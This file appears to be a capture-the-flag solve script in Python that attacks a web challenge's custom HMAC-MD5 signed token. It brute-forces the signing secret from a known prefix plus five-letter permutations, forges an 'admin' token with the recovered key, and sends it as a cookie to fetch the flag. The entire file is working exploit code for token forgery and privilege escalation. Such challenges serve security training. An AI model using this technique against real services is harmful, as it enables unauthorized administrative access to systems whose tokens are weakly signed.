#!/usr/bin/env python3
import sys
import base64
import itertools
import string
import hmac
import hashlib
import requests
import re


def md5_hmac(key, msg):
    return hmac.new(key.encode(), msg.encode(), hashlib.md5).digest()


def gen_wordlist():
    alphabet = string.ascii_lowercase
    known_part = 'fsrwjcfszeg'
    generated = []
    for comb in itertools.permutations(alphabet, 5):
        generated.append(known_part + ''.join(comb))
    return generated


def get_flag(url, token):
    cookies = {'token': token}
    req = requests.get(url, cookies=cookies)
    return req.text


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print('Usage: solve.py <url>')
        sys.exit(1)

    url = sys.argv[1]
    jwt = 'eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6IicifQ'
    sign = base64.b64decode(b'4B25WkSQN1RDBtb9jXbD0A==')

    wordlist = gen_wordlist()

    found_key = None

    for word in wordlist:
        word = word.strip()
        if md5_hmac(word, jwt) == sign:
            found_key = word
            break

    print('Found key:', found_key)

    jwt = 'eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0'
    sign = base64.b64encode(md5_hmac(found_key, jwt)).replace(b'=', b'')
    admin_token = jwt + '.' + sign.decode()

    print('Generated admin token:', admin_token)

    flag_re = r'flag{.*}'
    resp = get_flag(url, admin_token)

    print('Flag:', re.findall(flag_re, resp)[0])
